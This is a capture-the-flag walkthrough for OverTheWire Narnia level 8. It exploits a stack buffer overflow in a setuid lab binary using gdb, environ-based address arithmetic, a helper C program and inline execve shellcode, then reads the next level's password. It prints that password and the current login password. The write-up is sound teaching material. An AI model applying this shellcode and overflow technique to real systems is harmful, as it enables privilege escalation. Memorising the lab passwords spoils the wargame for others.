# Level 8 → Level 9

## Solution
```
ssh narnia8@narnia.labs.overthewire.org -p 2226
```
```
1aBcDgPttG
```
```
cd /narnia ; ls -al
```
```
./narnia8
```

![](0.png)

![](1.png)


Let's look at the code:

```
cat narnia8.c
```

The printed file is shown below:

```c
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// gcc's variable reordering fucked things up
// to keep the level in its old style i am
// making "i" global until i find a fix
// -morla
int i;

void func(char *b){
        char *blah=b;
        char bok[20];
        //int i=0;

        memset(bok, '\0', sizeof(bok));
        for(i=0; blah[i] != '\0'; i++)
                bok[i]=blah[i];

        printf("%s\n",bok);
}

int main(int argc, char **argv){

        if(argc > 1)
                func(argv[1]);
        else
        printf("%s argument\n", argv[0]);

        return 0;
}
```

Let's look at the stack just after memset:
```
gdb ./narnia8
```
```
disas func
```

![](2.png)

```
b *0x080491a2
```
```
r $(perl -e 'print "A"x19')
```
```
x/40wx $sp
```

![](3.png)

* Yellow - `bok`
* Red - `blah`, contain the address of `argv[1]`
* Blue - `$bp` register
* Green - Return falue from the `func` to the `main`.

Now, let's take a look at argv[1]:

```
x/s 0xffffd7b0
```

![](4.png)

Let's note **where the argvs are actually** located in memory:

```
x/5s 0xffffd7b0
```

![](5.png)

looks familiar?<br />
This is because, in fact, the argvs go in right above the environment variables!

```
x/4s *((char **) environ)
```

![](6.png)

**Conclusion:**<br />
The formula for calculating the address of the variable argv[1] (if there is only one) is <br />
**`argv[1] = environ - len(argv[1]) - 1`** where the `-1` is to include the NULL at the end of the string.<br />

We need a part of the string (more precisely, index 20 to index 24) to contain the address of the string itself. Otherwise in the stack, the 20th byte will overwrite **the address** (of the string itself!) and the program will no longer refer to its place in memory to continue inserting values into the stack.<br />

And so when we know the size of the string `argv[1]`, we can easily calculate its position and insert it into the string itself.<br />

Since we want the string to overwrite the return-address-to-main, then the length of the string `argv[1]` should be 32 bytes (20 + 4 + 4 + 4).<br />

So argv[1]'s address is:<br />
**`argv[1] = ((char **)enviorn) - 32 - 1 = 0xffffd7c4 - 33 = 0xffffd7a3`**

So the input string can be something like:
```
r $(perl -e 'print "A"x20, "\xa3\xd7\xff\xff", "BBBB", "CCCC"')
```
```
x/40wx $sp
```

![](7.png)

```
b *0x080491e6
```
```
c
```
```
x/40wx $sp
```

![](8.png)


Okay, so far so good.<br />
But - we'd like to replace "CCCC" with the address of...<br />
of what?

Can we insert shellcode in `argv[2]` and use its address?<br />
We will take a shellcode from previous challenges and try:

* shellcode (level1->level2): `\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80`
* argv[2] == shellcode, so len(argv[2]) == 33

* argv[1] == ((char **)environ) - ((len(argv[1]) + 1) + (len(argv[2]) + 1)) == ((char **)environ) - (33 + 34) == 0xffffd7c4 - 67 == 0xffffd781

* argv[2] == ((char **)environ) - (len(argv[2]) + 1) == argv[1] + (len(argv[1]) + 1) == 0xffffd781 + 33 == 0xffffd7a2

So, let's try this from the begining:
```
gdb ./narnia8
```
```
b *0x080491a2
```
```
b *0x080491e6
```
```
r $(perl -e 'print "A"x20, "\x81\xd7\xff\xff", "BBBB", "\xa2\xd7\xff\xff"') $(perl -e 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')
```
```
x/40wx $sp
```

![](9.png)

```
c
```
```
x/40wx $sp
```

![](10.png)


```
x/6s *((char **)environ) - 67
```

![](11.png)

* `67`: (len(argv[1]) + 1) + (len(argv[2]) + 1)
* `0xffffd781`: argv[1]
* `0xffffd7a2`: argv[2], the shellcode address!

```
del 1
```
```
del 2
```
```
c
```

![](12.png)

It worked, we got a shell.<br />
Now it remains to do the same thing outside of gdb.

The problem is - **we don't know the addresses now**.<br />
But, if we only manage to find out the address of `envinron`, we will win, because we can calculate the other addresses from it.


```
cd $(mktemp -d)
```
```
vim getenv.c
```
```c
 /********************************
  * /tmp/tmp.W5iNoFSMZz/getenv.c *
  ********************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv)
{
        char *environ = getenv("SHELL")-strlen("SHELL=");
        char *argv_1 = NULL;
        char *argv_2 = NULL;

        printf("%p: %s\n", argv[0], argv[0]);

        if(argc == 2){
            argv_1 = environ - strlen(argv[1]) - 1;
            printf("%p: %s\n", argv_1, argv_1);
        }

        if(argc == 3){
            argv_1 = environ - ((strlen(argv[1]) + 1) + (strlen(argv[2]) + 1));
            argv_2 = argv_1 + strlen(argv[1]) + 1;
            printf("%p: %s\n", argv_1, argv_1);
            printf("%p: %s\n", argv_2, argv_2);
        }

        printf("%p: %s\n", environ, environ);

        return 0;
}
```
```
gcc -m32 getenv.c -o getenv
```

![](13.png)

Indeed, according to the formula (in this case of input: `subtracting 67` bytes from `environ` to get `argv[1]`, and `adding 33` to `argv[1]` to reach `argv[2]`) the correct addresses were indeed obtained:

![](14.png)

* 0xffffd777 = 0xffffd7ba - 67
* 0xffffd798 = 0xffffd7ba - 67 + 33

By trial and error, it can be concluded that the position where the `environ` is set depends on the length of the name of the script.<br/>
* If the name increases by one character, 2 characters must be subtracted from the addresses.<br />
* If the name decreases by one character, 2 characters must be added to the addresses.

So,

* len("/tmp/tmp.W5iNoFSMZz/getenv") == 26
* len("./narnia8") == 9
* 17 == 26 - 9
* 0xffffd799 == 0xffffd777 + 17*2
* 0xffffd7ba == 0xffffd798 + 17*2

```
./narnia8 $(perl -e 'print "A"x20, "\x99\xd7\xff\xff", "BBBB", "\xba\xd7\xff\xff"')
 $(perl -e 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62
\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')
```
```
whoami
```
```
id
```
```
cat /etc/narnia_pass/narnia9
```

![](15.png)

```
rm -r /tmp/tmp.W5iNoFSMZz # remove your temp directory
```

## Password for the next level:
```
eRfb1uJaeO
```
